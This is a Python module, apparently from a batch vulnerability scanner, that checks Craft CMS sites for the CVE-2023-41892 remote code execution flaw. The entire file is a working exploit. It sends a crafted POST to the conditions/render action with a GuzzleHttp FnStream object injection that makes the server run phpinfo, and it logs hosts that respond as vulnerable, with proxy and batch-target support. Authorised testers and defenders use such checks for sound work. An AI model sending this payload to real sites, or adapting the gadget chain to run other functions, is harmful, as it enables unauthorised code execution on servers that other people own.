#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2023_41892:
    def main(self,target):
        self.batch = target["batch_work"]
        # 替换为目标CraftCMS的主机名
        hostname = target["url"].strip("/ ")
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)


        # 构建HTTP POST请求
        url = hostname+f"/index.php"
        headers = {
            "User-Agent":header,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload = {
            "action": "conditions/render",
            "test[userCondition]": "craft\\elements\\conditions\\users\\UserCondition",
            "config": '{"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}'
        }
        if not self.batch:
            OutPrintInfo("Craft", "开始检测Craft CMS CVE-2023-41892远程代码执行...")
        try:
            # 发送HTTP POST请求
            response = requests.post(url, headers=headers, data=payload,proxies=self.proxy,verify=self.ssl)

            # 检查响应内容是否匹配关键词
            keywords = ["PHP Credits", "PHP Group", "CraftCMS"]
            if all(keyword.lower() in response.text.lower() for keyword in keywords):
                OutPrintInfoSuc("Craft",f"目标存在CVE-2023-41892漏洞: {url}")
                if self.batch:
                    OutPutFile("craft_2023_41892.txt",f"目标存在CVE-2023-41892漏洞: {url}")
            else:
                if not self.batch:
                    OutPrintInfo("Craft","Not vulnerable")
        except Exception:
            if not self.batch:
                OutPrintInfo("Craft","目标请求出错")
        if not self.batch:
            OutPrintInfo("Craft", "Craft CMS CVE-2023-41892远程代码执行检测结束")